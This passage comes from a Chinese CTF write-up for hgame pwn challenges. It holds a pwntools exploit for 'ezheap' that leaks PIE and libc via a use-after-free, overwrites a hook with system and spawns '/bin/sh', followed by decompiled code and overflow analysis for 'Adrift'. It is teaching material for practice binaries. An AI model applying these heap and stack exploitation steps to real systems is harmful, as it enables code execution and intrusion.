class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>(<span class="params">pl</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;hook\n&#x27;</span>)</span><br><span class="line">    io.sendline(pl)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak1=u64(io.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">pie = leak1 - <span class="number">0x3808</span></span><br><span class="line">success(<span class="built_in">hex</span>(pie))</span><br><span class="line">chunk0 = pie + <span class="number">0xe010</span></span><br><span class="line">note = pie + <span class="number">0x3880</span></span><br><span class="line">hook = pie + <span class="number">0x3828</span></span><br><span class="line">puts_got = pie + elf.got.puts</span><br><span class="line">success(<span class="string">f&#x27;note:---&gt;&#x27;</span>+<span class="built_in">hex</span>(note))</span><br><span class="line">success(<span class="string">f&#x27;puts_got:&#x27;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line">edit(<span class="number">0</span>,p64(note-<span class="number">0x10</span>)*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(puts_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.puts</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(hook)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(sys))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸€ä¸‹ç¨‹åºä¿æŠ¤ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/xizi/Desktop/hgame/ezheap/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    FORTIFY:    Enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¦åšåˆ°æˆ‘ä»¬ä¸Šè¿°æ€è·¯çš„è¯ã€‚é¦–å…ˆlibcçš„åŸºåœ°å€æ˜¯ä¸€å®šè¦çš„ã€‚ç„¶åpieçš„è¯ä¹Ÿéœ€è¦ã€‚å› ä¸ºæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æˆ‘ä»¬notesçš„åœ°å€å’Œhookçš„åœ°å€ã€‚å› ä¸ºç›´æ¥åˆ©ç”¨6çš„è¯ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„giftå‡½æ•°ä¼šå¯¼è‡´ç¨‹åºç›´æ¥é€€å‡ºã€‚æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ï¼ˆå¯èƒ½æ˜¯æˆ‘ä»¬è¾“å…¥çš„16è¿›åˆ¶å¤ªå¤§äº†ï¼Ÿï¼‰</p>
<p>è§£é‡Šä¸€ä¸‹expã€‚ï¼ˆå†™çš„å¾ˆçƒ‚QAQï¼‰</p>
<p>é¦–å…ˆï¼Œæˆ‘æœ¬æ¥æ˜¯æ²¡æœ‰çœ‹åˆ°mallocé‡å®šä¹‰çš„ã€‚æ‰€ä»¥æˆ‘æœ¬æ¥æ‰“ç®—é€šè¿‡unsorted bin æ¥æ³„éœ²libcåŸºåœ°å€ã€‚ä½†æ˜¯å‘ç°ï¼Œè¿™æ ·åªä¼šæ³„éœ²å‡ºpieã€‚å¯ä»¥é€šè¿‡gdbè°ƒè¯•å¾—åˆ°ã€‚ä¸ç®¡å †å—è®¾ç½®å¤šå¤§ï¼Œåˆ›ç«‹ä¸¤ä¸ªå †å—ï¼Œå¹¶ä¸”free0åå†ç”¨uafå»è®¿é—®0ï¼Œä¹Ÿå°±æ˜¯show0ã€‚è¿™æ ·åªä¼šæŠŠnoteså¤„çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç”³è¯·çš„ç¬¬ä¸€ä¸ªå †å—çš„åœ°å€é‡Œçš„å†…å®¹æ³„éœ²å‡ºæ¥ï¼Œä¹Ÿå°±å¯ä»¥å¾—åˆ°pieäº†ã€‚æ‰€ä»¥è¿™é‡Œæ˜¯æ³„éœ²ä¸å‡ºlibcçš„ã€‚é‚£æˆ‘ä»¬è¦æ€ä¹ˆåŠå‘¢ï¼Ÿå”¯ä¸€çš„åŠæ³•å°±æ˜¯é€šè¿‡show()é‡Œçš„putså‡½æ•°ã€‚ä¸è¿‡æˆ‘ä»¬è¦å¥½å¥½çœ‹ä¸€ä¸‹show()</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl show()</span><br><span class="line">&#123;</span><br><span class="line">  const char *s; // rdi</span><br><span class="line">  unsigned <span class="built_in">int</span> index; // [rsp+4h] [rbp-14h] BYREF</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  __printf_chk(1LL, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(1LL, <span class="string">&quot;There are only 16 pages in this notebook.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    s = notes[index];</span><br><span class="line">    <span class="keyword">if</span> ( s )</span><br><span class="line">      puts(s);                                  // æ³„éœ²libcåŸºå€</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      __printf_chk(1LL, <span class="string">&quot;Page not found.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„så…¶å®å¯ä»¥ç†è§£ä¸ºåœ°å€ã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬å†™å…¥çš„åºå·ï¼Œä¼šè·³åˆ°noteså¯¹åº”çš„å †å—ã€‚ç„¶åä¼šæŠŠæˆ‘ä»¬åˆ›ç«‹çš„å †å—çš„åœ°å€ä¼ ç»™sã€‚ç„¶åæ‰“å°ã€‚ä½†æ˜¯ï¼Œå¹¶ä¸æ˜¯è¯´æˆ‘ä»¬å¾€å †å—é‡Œå†™å…¥æ¯”å¦‚puts_gotå†å»æ‰“å°ï¼Œå°±èƒ½æ‰“å°å‡ºpltçš„åœ°å€äº†ã€‚è€Œæ˜¯è¦æŠŠnotesæŒ‡å‘å †å—çš„åœ°å€æ”¹æˆæˆ‘ä»¬çš„puts_gotçš„åœ°å€ã€‚æ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªéš¾ç‚¹ã€‚å…·ä½“æˆ‘æ˜¯æ€ä¹ˆå®ç°çš„æˆ‘å…¶å®ä¹Ÿæ²¡æœ‰å®Œå…¨ææ‡‚ã€‚ç®—æ˜¯è¯•å‡ºæ¥çš„ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒçƒ‚å§ã€‚å“ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(note-<span class="number">0x10</span>)*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(puts_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.puts</span><br></pre></td></tr></table></figure>

<p><img src="/images/hgame1.png" alt="gdb"></p>
<p>å¯ä»¥çœ‹å‡ºï¼Œæ­¤æ—¶æˆ‘ä»¬æŠŠæˆ‘ä»¬å»ºç«‹çš„ä¸¤ä¸ªå †å—çš„åœ°å€éƒ½æ”¹å†™æˆäº†noets-0x10åœ°å€çš„ä½ç½®ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å†™å…¥å †å—1æ¥æŠŠnotes[0]å¤„çš„åœ°å€è¦†ç›–äº†puts_gotåœ°å€ã€‚ç„¶åç”¨uafæ¥æ³„éœ²libcåŸºåœ°å€ã€‚åé¢å†™å…¥hookæ˜¯ä¸€æ ·çš„ã€‚åªéœ€è¦å†æ¬¡è¦†ç›–æ‰notes[1]çš„åœ°å€ä¸ºhookï¼Œç„¶åå†å¾€1é‡Œå†™å…¥systemçš„åœ°å€ã€‚å¹¶ä¸”åœ¨chunk2é‡Œå†™å…¥&#x2F;bin&#x2F;sh\x00ï¼Œfreeæ‰å°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sys = base + libc.sym.system</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(hook)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(sys))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æœ‰çš„å…·ä½“ç»†èŠ‚æˆ‘è¿˜æ˜¯æ²¡èƒ½å®Œå…¨ç†è§£ï¼Œè™½ç„¶æ˜¯è‡ªå·±å†™çš„ï¼Œä½†æ˜¯è¿˜æ˜¯å¸Œæœ›èƒ½ä»”ç»†é˜…è¯»å®˜æ–¹wpåå†ç²¾è¿›å§ã€‚expçƒ‚ï¼Œå‹¿å–·QAQã€‚</p>
<h2 id="2-Adrift"><a href="#2-Adrift" class="headerlink" title="2.Adrift"></a>2.Adrift</h2><p>è¿™é¢˜å°±æ˜¯åå‘äºæ ˆäº†ã€‚æ¯”ä¸Šé¢ä¸€é“å †é¢˜è¿˜æ˜¯æ¯”è¾ƒå‹å¥½çš„ğŸ˜ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rdx</span></span><br><span class="line">  __int16 n200; <span class="comment">// ax</span></span><br><span class="line">  _WORD v6[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-400h] BYREF</span></span><br><span class="line">  __int16 i; <span class="comment">// [rsp+4h] [rbp-3FCh]</span></span><br><span class="line">  _QWORD buf[<span class="number">125</span>]; <span class="comment">// [rsp+6h] [rbp-3FAh] BYREF 1018</span></span><br><span class="line">  __int64 canary; <span class="comment">// [rsp+3F0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))init_canary)(argc, argv, envp);</span><br><span class="line">  canary = ::canary;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;choose&gt; &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, v6);</span><br><span class="line">    <span class="keyword">switch</span> ( v6[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;way&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">1040uLL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;distance&gt; &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">200</span> &amp;&amp; dis[i]; ++i )</span><br><span class="line">          ;</span><br><span class="line">        v3 = (_QWORD *)((<span class="type">char</span> *)&amp;str + <span class="number">1304</span> * i);</span><br><span class="line">        *v3 = buf[<span class="number">0</span>];</span><br><span class="line">        v3[<span class="number">124</span>] = buf[<span class="number">124</span>];</span><br><span class="line">        qmemcpy(</span><br><span class="line">          (<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)(v3 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8L</span>L),</span><br><span class="line">          (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">char</span> *)buf - ((<span class="type">char</span> *)v3 - ((<span class="type">unsigned</span> __int64)(v3 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8L</span>L))),</span><br><span class="line">          <span class="number">8LL</span> * ((((_DWORD)v3 - (((_DWORD)v3 + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>) + <span class="number">1000</span>) &amp; <span class="number">0xFFFFFFF8</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;dis[i]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;index&gt; &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, v6);</span><br><span class="line">        n200 = v6[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v6[<span class="number">0</span>] &lt;= <span class="number">0</span> )</span><br><span class="line">          n200 = -v6[<span class="number">0</span>];</span><br><span class="line">        v6[<span class="number">0</span>] = n200;</span><br><span class="line">        <span class="keyword">if</span> ( n200 &gt; <span class="number">200</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;invalid index&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;a new distance&gt; &quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;dis[v6[<span class="number">0</span>]]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( canary != ::canary )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;it&#x27;s a poor decision :(&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜çœ‹ä¸Šå»å…¶å®è¿˜æ˜¯å¾ˆå“äººã€‚ä¾æ—§æœ‰èœå•çš„é€‰æ‹©ã€‚æˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹è¿™é‡Œå…·ä½“å¹²äº†äº›ä»€ä¹ˆã€‚å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™é‡Œä¸æ˜¯ç¨‹åºè®¾ç½®çš„canaryä¿æŠ¤ã€‚è€Œæ˜¯äººä¸ºçš„è®¾ç½®äº†ä¸€ä¸ªcanaryã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 *<span class="title function_">init_canary</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 *result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v1 = (__int64)&amp;v1;</span><br><span class="line">  result = &amp;v1;</span><br><span class="line">  canary = (__int64)&amp;v1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œçš„canaryæ˜¯å–å¾—v1çš„åœ°å€ã€‚é‚£ä¹ˆv1åœ¨å“ªå‘¢ï¼Ÿå½“ç„¶æ˜¯åœ¨æ ˆä¸Šäº†ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬å¾—åˆ°äº†canaryï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¾—åˆ°äº†æ ˆåœ°å€ã€‚éå¸¸å…³é”®ã€‚è¿™ä¸ªæ—¶å€™å†æ¥çœ‹ä¸‹ä¿æŠ¤ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/xizi/Desktop/hgame/adrift/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨å¯è¯»å¯å†™å¯æ‰§è¡Œçš„æ®µã€‚æ ˆå¯æ‰§è¡Œã€‚é‚£ä¹ˆæˆ‘çš„æ€è·¯å¾ˆæ˜ç¡®äº†ã€‚shellcodeã€‚è€Œä¸”æ˜¯å†™åœ¨æ ˆä¸Šçš„shellcodeã€‚å¹¶ä¸”ç”±äºæˆ‘ä»¬çŸ¥é“äº†æ ˆåœ°å€ã€‚æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“æˆ‘ä»¬å†™å…¥æ•°æ®çš„èµ·å§‹åœ°å€ã€‚okç»“æŸã€‚ä½†æ˜¯å½“æˆ‘ä»¬ä»”ç»†ä»£ç å®¡è®¡åï¼Œä¼šå‘ç°ä¸€ä»¶ç‰¹åˆ«ä¼¤å¿ƒçš„äº‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, v6);</span><br><span class="line"><span class="keyword">switch</span> ( v6[<span class="number">0</span>] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;way&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1040uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;distance&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">200</span> &amp;&amp; dis[i]; ++i )</span><br><span class="line">      ;</span><br><span class="line">    v3 = (_QWORD *)((<span class="type">char</span> *)&amp;str + <span class="number">1304</span> * i);</span><br><span class="line">    *v3 = buf[<span class="number">0</span>];</span><br><span class="line">    v3[<span class="number">124</span>] = buf[<span class="number">124</span>];</span><br><span class="line">    qmemcpy(</span><br><span class="line">      (<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)(v3 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8L</span>L),</span><br><span class="line">      (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">char</span> *)buf - ((<span class="type">char</span> *)v3 - ((<span class="type">unsigned</span> __int64)(v3 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8L</span>L))),</span><br><span class="line">      <span class="number">8LL</span> * ((((_DWORD)v3 - (((_DWORD)v3 + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>) + <span class="number">1000</span>) &amp; <span class="number">0xFFFFFFF8</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;dis[i]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä»£ç å®¡è®¡çš„è¿‡ç¨‹ä¸­ï¼ˆæ±‚åŠ©aiï¼‰ã€‚å¯ä»¥å‘ç°ï¼Œè¿™é‡Œå¹²äº†ä¸€ä»¶ç‰¹åˆ«å¤æ‚çš„äº‹æƒ…ã€‚ä¸è¿‡å…¶å®å°±æ˜¯å°†æˆ‘ä»¬çš„æ•°æ®æ‹·è´è‡³strå¤„ã€‚å¹¶ä¸”å°†æˆ‘ä»¬çš„æ ˆçš„æ•°æ®æ¸…0ã€‚é‚£å¾ˆå®Œè›‹äº†ã€‚æ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬å†æ¥ä»”ç»†çœ‹ä¸€ä¸‹ã€‚è¿™é‡Œæˆ‘ä»¬èƒ½è¯»å…¥0x410çš„æ•°æ®ã€‚è€Œç¼“å†²åŒºå¤§å°ä¸º8*125&#x3D;1000ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä»ç„¶å­˜åœ¨40å­—èŠ‚çš„æº¢å‡ºã€‚</p>
<p><img src="/images/hgame2.png"></p>
<p>æ ¹æ®ä¸Šå›¾å¸Œæœ›å¯¹ç†è§£æ›´æœ‰å¸®åŠ©ã€‚ä¸è¿‡æƒ³è¦æŒ‰ç…§æˆ‘ä»¬çš„æ‰§è¡Œæµæ¥æ‰§è¡Œçš„è¯ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦å¯¹canaryå»è¿›è¡Œæ³„éœ²çš„ã€‚è¿™é‡Œå°±è¦å€ŸåŠ©æˆ‘ä»¬çš„show()äº†ã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹showå…·ä½“å¹²äº†ä»€ä¹ˆã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 n199; <span class="comment">// rax</span></span><br><span class="line">  __int16 n199_1; <span class="comment">// [rsp+Eh] [rbp-2h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;n199_1);</span><br><span class="line">  LOWORD(n199) = n199_1;</span><br><span class="line">  <span class="keyword">if</span> ( n199_1 &lt;= <span class="number">0</span> )</span><br><span class="line">    LOWORD(n199) = -n199_1;</span><br><span class="line">  n199_1 = 